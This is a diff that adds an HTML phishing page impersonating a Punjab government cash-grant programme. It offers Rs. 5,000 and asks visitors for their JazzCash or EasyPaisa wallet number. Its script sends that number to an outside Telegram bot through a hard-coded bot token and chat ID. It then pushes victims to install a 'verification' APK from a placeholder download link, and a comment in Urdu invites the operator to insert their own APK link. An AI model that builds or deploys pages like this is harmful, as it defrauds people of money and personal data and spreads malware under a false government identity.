@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CM Punjab Honahar Program</title>
+    <style>
+        :root { --green: #1a7d32; --bg: #f4f7f6; }
+        body { background: var(--bg); font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .reward-card { width: 90%; max-width: 380px; background: white; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; border-top: 8px solid var(--green); padding: 20px; }
+        .title { font-size: 20px; font-weight: bold; color: var(--green); }
+        .amount { font-size: 38px; font-weight: 800; color: #333; margin: 15px 0; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; outline: none; }
+        .claim-btn { width: 90%; padding: 15px; background: var(--green); color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="reward-card">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/0/02/Punjab_Government_Logo.svg/1200px-Punjab_Government_Logo.svg.png" width="80">
+        <div class="title">Maryam Nawaz Cash Grant</div>
+        <p style="font-size: 13px; color: #666;">Apply for Rs. 5000 Monthly Reward</p>
+        <div class="amount">Rs. 5,000</div>
+        <input type="tel" id="u_num" placeholder="JazzCash/EasyPaisa Number">
+        <button class="claim-btn" onclick="sendToBot()">WITHDRAW NOW</button>
+        <p style="font-size: 10px; color: #999; margin-top:15px;">*Auto-verification APK installation required for reward.</p>
+    </div>
+
+    <script>
+        function sendToBot() {
+            const num = document.getElementById('u_num').value;
+            const token = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
+            const chatID = "7107389141";
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=💰 *NEW REWARD HIT*%0ANumber: ${num}&parse_mode=Markdown`);
+            
+            alert("Verification Started! Please install the Verification App to receive funds.");
+            // Yahan se aap user ko apni APK download link par bhej sakte hain
+            window.location.href = "YOUR_APK_DOWNLOAD_LINK_HERE";
+        }
+    </script>
+</body>
+</html>
